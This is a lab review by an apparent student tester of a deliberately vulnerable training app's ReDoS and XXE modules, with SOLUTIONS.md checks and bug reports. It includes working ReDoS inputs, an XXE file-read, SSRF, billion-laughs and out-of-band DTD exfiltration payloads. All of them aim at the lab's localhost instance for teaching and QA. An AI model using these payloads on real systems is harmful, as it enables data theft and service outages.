# Student Review: Repeater Ron (burp-02)

- Modules tested: redos (4 challenges), xxe (8 challenges). All 12 completed and re-verified post-reboot on the live pool instance at http://127.0.0.1:18407/ with a fresh cookie jar (curl standing in for Burp Repeater). Final scoreboard: 13 / 201 (4 redos + 8 xxe + 1 jsonp array-hijack from the SOLUTIONS.md accuracy checks). All results below were verified AFTER the ~01:37 UTC VM reboot, which reset scoreboard progress to 0/201 and rotated per-boot secrets.

## Burp-first playbook per challenge

Every exploit below is described as a Burp Repeater flow (what to click), then confirmed with the equivalent curl request. My cookie jar was /tmp/cookies-burp-02.txt.

### redos

Burp setup for the whole module: proxy the browser to Burp, open /redos/email (or username/url/search), submit the form once with a harmless value, send the captured request to Repeater (Ctrl+R), and tune the input parameter while watching the Repeater response timer.

1. **redos-email (Catastrophic Email Regex).** In Repeater, set `email` to 30 repeated `a` characters followed by `!` (31 chars total, under the 33-char cap), URL-encoded into the query string of `GET /redos/email`. The response page reports the check time (it printed ~22.8s for my run) and the lab awarded the flag once the timer crossed 1000 ms.
   - curl equivalent: `curl -G "http://127.0.0.1:18407/redos/email" --data-urlencode "email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"`.
   - The challenge card tells you the exact shape ("about 30 repeated valid local-part characters followed by a character outside the allowed set, keep the total at or under the 33 character cap"), and it works verbatim.

2. **redos-username (Nested Quantifier Username).** In Repeater, set `username` to 28 `a`s followed by `b` (29 chars, under the 30-char cap) on `GET /redos/username`. My run took ~56.8s server-side; the lab awarded the flag.

3. **redos-url (Catastrophic URL Regex).** In Repeater, set `url` to `http://example.com/` plus `a/` repeated 12 times, ending with `!` (43 chars, under the 46-char cap) on `GET /redos/url`. My run took ~13.1s; the lab awarded the flag.

4. **redos-search (Regex Injection Search).** In Repeater, `GET /redos/search?q=a` (the query becomes the compiled atom, so the pattern becomes ^((a)+)+$ against the 26-`a`s-plus-`!` haystack). My run took ~20.4s; the lab awarded the flag. POST with form field `q` also works; the 1-10 lowercase letters constraint is enforced before compiling.

### xxe

Burp setup for the whole module: proxy the browser, open each form (e.g. /xxe/import), submit once with plain XML, send the POST to Repeater (Ctrl+R), and replace ONLY the form field (`xml`, `svg`, etc.) with your DOCTYPE payload. URL-encode the body before sending in Repeater so `&` characters survive (select body text, right-click, URL-encode), exactly as the /xxe/billion page advises.

1. **file (XXE File Read).** In Repeater, POST to `/xxe/import` with `xml` = `<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///.../modules/xxe/secret.txt">]><data>&xxe;</data>` (absolute path; the OOB collector page's starter DTD prints the right absolute path for the running instance). The lab awarded the flag.

2. **ssrf (SSRF via XXE).** Same form, but the entity SYSTEM URI is `http://127.0.0.1:18407/ssrf/internal/secret`. The server fetches the URL itself and splices the secret into the parsed output; the lab awarded the flag.

3. **xxe-billion-laughs.** In Repeater, POST to `/xxe/billion` with `xml` = the classic nested shape: `<!ENTITY lol "xxxxxxxxxx">` then `lol2` = ten `&lol;`, up to `lol7`, referencing `&lol7;` in `<data>` (525 bytes total, under the 3000-char cap). Parser busy time printed 3500 ms; the lab awarded the flag.

4. **xxe-external-dtd.** Two Repeater/Proxy steps: (a) in Proxy, POST `/xxe/collector/dtd` with `dtd` = `<!ENTITY % file SYSTEM "file://.../modules/xxe/secret.txt">` + `<!ENTITY pingback SYSTEM "http://127.0.0.1:18407/xxe/collector/log?d=%file;">`; (b) in Repeater, POST `/xxe/dtd` with `xml` = a DOCTYPE declaring `<!ENTITY % dtd SYSTEM "http://127.0.0.1:18407/xxe/collector/dtd">` followed by `%dtd;`, with `&pingback;` in the body. The response reported 2 pingbacks carrying the secret and the lab awarded the flag.

5. **xxe-svg.** In Repeater, POST `/xxe/svg` with `svg` = an SVG document with the DOCTYPE/entity and `&xxe;` inside `<text>` (the field name is `svg`, confirmed on the form page). The lab awarded the flag.

6. **xxe-xinclude.** In Repeater, POST `/xxe/xinclude` with `xml` = `<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file://.../modules/xxe/secret.txt" parse="text"/></data>`. The lab awarded the flag.

7. **xxe-param-oob.** In Repeater, POST `/xxe/param` with `xml` = a DOCTYPE declaring `<!ENTITY % file SYSTEM "file://...secret.txt">` and `<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://127.0.0.1:18407/xxe/collector/log?d=%file;'>">`, then `%oob;`, with `&exfil;` in the body. Quoting matters (outer double quotes, inner single quotes), as the page says. The lab awarded the flag. NOTE: building this payload through shell quoting once produced a broken payload that silently gave 0 pingbacks; writing the payload to a file and using `--data-urlencode "xml@file"` is the reliable route.

8. **xxe-soap.** In Repeater, POST `/xxe/soap` with `xml` = a full SOAP envelope carrying the DOCTYPE/file entity, with `&xxe;` inside `<soap:Body>`. The lab awarded the flag.

## Cheat and replay tests

- **Bare claim without exploit:** on the xxe OOB challenges, I GET-pinged `/xxe/collector/log?d=XXE-SECRET-4471` myself, then POSTed empty XML to `/xxe/dtd`. The response reported 0 pingbacks carrying the secret and no flag was awarded (the award only counts pingbacks that arrived during that request, so backdated self-pings do not count).
- **Replays:** re-firing the same file-read XXE request re-awarded the same flag value, no errors. Expected idempotent behavior, not a cheat.
- **Negative control:** a trivial `a!` input to `/redos/email` reported 0 ms and no flag.
- **Cold beacons (postmsg/csti):** beacon GETs without the page-bound one-time token were rejected, no flag awarded (verified live).

## SOLUTIONS.md accuracy

Checked the 4 assigned solutions against the live instance (routes from code, behavior from live requests):

1. **session fixation: STALE/WRONG.** The routes exist: `GET /session/fixation/preset` returns 302 and sets `lab_sid=attacker123` (confirmed in the jar). But the documented login credential (`admin` / `admin123`) is rejected by the live instance with "Bad username or password" (HTTP 403), and the documented curl block itself contains `password=<redacted>`, so the steps cannot be followed verbatim. The live fixation page's own placeholder still says "try admin123", which is what the doc prose says too, so this looks like the live pool instance's credential store diverges from both the doc and the page. No flag was awarded because login never succeeded. The Burp workflow text is fine as far as it goes, but the credential step is broken on the live instance.
2. **postmsg no-check: ACCURATE.** Routes exist (`/postmsg/no-check/attacker` 200, victim iframe, Fire payload button present). The code confirms the victim fires `/postmsg/beacon?v=no-check` itself with a page-bound one-time token, and my live cold-beacon replay without a token was rejected with no flag, exactly as the Burp workflow text says. The full click-through needs a real browser (postMessage never crosses the wire), which the doc explains honestly.
3. **jsonp array-hijack: STALE.** The documented manual equivalent (`{"items":["alice:A1","bob:B2","carol:C3"]}` to `/jsonp/array-beacon`) returns HTTP 400 `{"ok":false,"error":"beacon must carry the hijacked items array"}` and no flag, because the handler now also requires the per-session `feed-token:<tok>` element in the items array (the legacy feed emits it, and the browser flow captures it). When I sent the items array including the real `feed-token:` element from my session's feed, the beacon returned `ok:true` and the lab awarded the flag. The doc's curl needs that extra element.
4. **csti basic: ACCURATE.** `POST /csti/basic` with a `tpl` field exists (returns 302 after save), the `/csti/beacon?v=basic` route exists, and my cold beacon without the page-bound nonce was rejected with no flag, matching the code comment that bare beacons are rejected. The rest is browser-driven template evaluation, as documented.

Note: several SOLUTIONS.md snippets reference `http://localhost:3000` or `:3112`, while the live pool instance runs on `http://127.0.0.1:18407/`; the doc's Burp workflow sections do say to adjust host/port, but the raw curl snippets do not work as copied.

## What worked well

- The ReDoS module is a great Burp-first module: the response page prints the exact regex, the timing, and the threshold, and the Repeater timer makes the exponential blowup viscerally visible.
- The XXE module's hint ladders are genuinely good: level 1 nudges, level 2 names the technique, level 3 gives the payload shape, and the challenge cards name the right form field for each challenge.
- The /xxe/billion page explicitly tells you to URL-encode the body in Repeater so `&` survives; the ssrf hint does the same. These tiny Repeater-specific notes are exactly what a Burp learner needs.
- The OOB collector page prints a ready-to-paste starter DTD, which saves a lot of fumbling.
- Anti-cheat is sound where I tested it: OOB awards only count pingbacks from the request itself, and page-bound one-time tokens reject cold beacons.

## Bugs found (with reproduction)

1. **Session fixation credential mismatch (live instance).** Reproduction: `curl -c jar -b jar http://127.0.0.1:18407/session/fixation/preset` (302, jar gets `lab_sid=attacker123`), then `curl -b jar --data-urlencode "username=admin" --data-urlencode "password=<redacted>" http://127.0.0.1:18407/session/fixation/login` returns HTTP 403 "Bad username or password". Also tried the seeded `alice`/`alice123` user, same result. The live page advertises "try admin123", the repo seed inserts `admin`/`admin123`, yet both are rejected. Verified both before and after the ~01:37 UTC reboot.
2. **jsonp array-beacon documented payload is stale (see SOLUTIONS.md section above).** The doc's manual curl lacks the `feed-token:<tok>` item now required by the handler.
3. **Collector starter DTD references a different checkout path.** The /xxe/collector "Starter DTD" block shows `file:///home/hatch/workspace/pentrix-verify/modules/xxe/secret.txt` while the repo under test is `pentrix-vulnlab`. Both paths happen to resolve on this pool instance and the secret file carries the same marker, so it works here, but on any deployment where the checkout path differs, a student copying the starter verbatim would get a silent entity error instead of the flag.
4. **Transient infrastructure issues on the shared pool instance.** Twice during testing (pre-reboot) the instance became unreachable (curl exit 7, HTTP 000) for 1-2 minutes, likely because another student's long ReDoS request blocks the single-threaded event loop for ~60s. A Burp learner with no server-side context will just see Repeater spin and may assume their payload is wrong. Also, one exec-level metadata timeout interrupted a test run. These are environment-level, not lab bugs, but they affect the lab experience.

## Friction/confusion points

- **ReDoS + shared instance + event loop blocking:** my own username exploit tied up the whole shared instance for ~57 seconds. In a classroom this is pedagogically perfect, but on a shared pool it means one student's legitimate flag attempt freezes everyone else's Burp session. A Burp learner who fires the email payload (~23s) and then a username payload (~57s) back to back will see Repeater time out on the second one and blame their payload.
- **Burp Community Intruder is throttled.** Hint 3 of redos-email suggests using Intruder with one payload position to sweep input length. That works in Community, but the throttling makes the sweep slow; a learner should be told to keep the payload set tiny (5-8 lengths) or just tune manually in Repeater. The guidance is not wrong, just missing that caveat.
- **Finding the absolute path is a gap for a Burp-first learner.** Every xxe file challenge says "use an absolute path", and the answer is only discoverable via the collector's starter DTD (for the DTD challenges) or by guesswork (for the plain file-read challenge, which comes first). The file challenge would benefit from pointing at the collector page's starter DTD for the path.
- **SOLUTIONS.md host/port mismatch.** Raw curl snippets use `:3000` and `:3112`; a Burp learner copying them onto the pool instance gets connection errors. The Burp workflow sections mention adjusting, but the snippets themselves would be safer with a `$BASE` variable.

## Hint quality (helpful? spoilery? useless?)

- ReDoS hints: level 3 is quite generous (gives the payload shape and the threshold number), but fair for a timing-based DoS module where the insight is the regex analysis, not payload syntax. Not useless, not unfair.
- XXE hints: level 3 sometimes gives nearly the full payload (e.g. the xinclude namespace, `parse="text"`), which borders on spoilery for a Medium. But the param-oob quoting trick and the SSRF chaining stay genuinely hard, so the ladder has a good spread overall.
- The module brief's worked XXE example is the right call: it teaches the pattern once, then every challenge asks for a variant.
- Hint quality deduction: the `how` text for redos-url embeds one specific payload shape ("http://example.com/ with a/ repeated 12 times and a trailing !") which turned out to work, fine, but a learner who tries e.g. `aaaa...` segments may not understand why only the path group matters. A one-line "the catastrophic group is the path group" would teach more.

## Difficulty fairness

- ReDoS: Easy/Medium across the four, fairly rated. The search one is the cleverest (input becomes the regex atom) and is rated Medium, fair.
- XXE: file/svg/soap are Easy/Medium and fair; ssrf chaining is fairly rated Hard because it requires discovering the internal endpoint and knowing the server makes the request. param-oob deserves its Hard rating mainly for quoting pain. Billion laughs is more about patience than difficulty.

## Burp-first feasibility

- Fully feasible for redos: everything is a Repeater request, and the Repeater response timer is the instrument. No browser needed at all.
- Fully feasible for xxe except none of it needs Intruder/Comparer/Sequencer; it is all Repeater plus the Proxy for capturing the form posts and watching OOB pingbacks land in the collector page. The URL-encoding note on /xxe/billion is a real Community gotcha it handles well.
- All Burp guidance names the right tool (Repeater for crafting, Proxy for capturing/watching). No guidance I saw requires Burp Pro features. The one throttled-Intruder caveat is noted above.
- Proxy history as the "proof" device (beacon requests, OOB pingbacks) is the right Burp-first framing and is used consistently.

## Suggestions (concrete)

1. Fix the live session fixation credential (or the page/doc) so the documented `admin`/`admin123` login works; also replace the `password=<redacted>` placeholder in SOLUTIONS.md's curl block with the real documented password.
2. Update the SOLUTIONS.md jsonp array-hijack manual curl to include the `feed-token:<tok>` item, with a step showing how to read the token from the legacy feed in Repeater (GET /jsonp/legacy?callback=gotFriends, copy the feed-token element).
3. Make the collector's starter DTD and the module brief use the running instance's own secret path (they already use SECRET_ABS on some pages; make it consistent everywhere, including the xxe/file hints) instead of a hardcoded checkout path.
4. Add the Burp Community Intruder throttling caveat to the redos-email hint 3 (keep payload sets small, or tune manually in Repeater).
5. Add a one-line note in the redos challenges that a successful attempt blocks the single-threaded server for up to a minute, so Repeater may appear to hang: wait, do not re-fire, watch the timer.
6. Parameterize SOLUTIONS.md curl snippets with a `$BASE` variable at the top of each section to kill the localhost:3000 / :3112 mismatch.

## Rating: 4
